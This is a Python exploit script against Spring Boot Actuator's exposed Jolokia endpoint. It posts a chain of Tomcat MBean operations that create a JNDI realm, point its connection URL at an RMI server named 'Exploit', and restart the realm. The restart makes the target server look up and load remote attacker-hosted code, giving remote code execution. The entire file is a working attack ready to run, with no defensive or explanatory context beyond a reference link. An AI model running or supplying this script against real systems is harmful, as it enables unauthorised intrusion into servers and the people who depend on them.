#!/usr/bin/env python3
# coding: utf-8
# Referer: https://ricterz.me/posts/2019-03-06-yet-another-way-to-exploit-spring-boot-actuators-via-jolokia.txt


import requests
import json


url = 'http://127.0.0.1:8080/actuator/jolokia'
#url = 'http://127.0.0.1:8080/jolokia'
jndi = 'rmi://localhost:1099/Exploit'


create_realm = {
    "mbean": "Tomcat:type=MBeanFactory",
    "type": "EXEC",
    "operation": "createJNDIRealm",
    "arguments": ["Tomcat:type=Engine"]
}

wirte_factory = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "contextFactory",
    "value": "com.sun.jndi.rmi.registry.RegistryContextFactory"
}

write_url = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "WRITE",
    "attribute": "connectionURL",
    "value": jndi
}

stop = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "stop",
    "arguments": []
}

start = {
    "mbean": "Tomcat:realmPath=/realm0,type=Realm",
    "type": "EXEC",
    "operation": "start",
    "arguments": []
}

flow = [create_realm, wirte_factory, write_url, stop, start]

r = requests.post(url, json=flow)
r.json()
print(r.status_code)
